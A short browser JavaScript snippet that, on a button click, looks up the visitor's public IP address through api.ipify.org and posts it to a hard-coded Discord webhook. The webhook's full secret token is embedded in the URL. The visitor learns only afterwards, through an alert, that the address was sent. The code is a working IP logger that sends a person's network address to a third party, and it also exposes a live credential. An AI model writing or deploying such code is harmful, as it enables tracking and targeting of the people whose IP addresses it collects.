const getIpBtn = document.getElementById('getIpBtn');

getIpBtn.addEventListener('click', async () => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    const ipAddress = data.ip;

    await fetch('https://discordapp.com/api/webhooks/1439301765223809054/wnIEKKbQ8ncRvNdmKa1XaOMtaSrRZ1_VfKBUwpp_DqeYRSTGpECePunmRlO0qzt8IWKC', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        content: `IP address received: \`${ipAddress}\``
      })
    });

    alert('IP address retrieved and sent to Discord!');
  } catch (error) {
    console.error('Error:', error);
    alert('An error occurred. Please try again.');
  }
});
